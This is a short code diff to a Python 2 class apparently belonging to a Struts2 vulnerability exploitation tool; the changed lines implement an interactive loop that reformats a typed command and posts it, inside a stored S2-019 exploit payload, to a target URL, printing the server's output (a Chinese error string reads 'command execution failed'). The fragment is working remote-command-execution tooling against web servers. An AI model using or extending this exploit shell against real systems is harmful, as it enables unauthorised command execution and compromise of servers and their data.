@@ -288,8 +288,8 @@ class struts_baseverify:
                 command = command.strip()
                 if command != "exit":
                     try:
-                        commurl = self.url
-                        req = requests.post(commurl, data=self.shell['struts2-019'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=6, verify=False)
+                        command = re.sub(r"\s{2,}", " ", command).replace(" ", "','")
+                        req = requests.post(self.url, data=self.shell['struts2-019'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=6, verify=False)
                         print req.text
                     except:
                         cprint("命令执行失败!!!", "red")
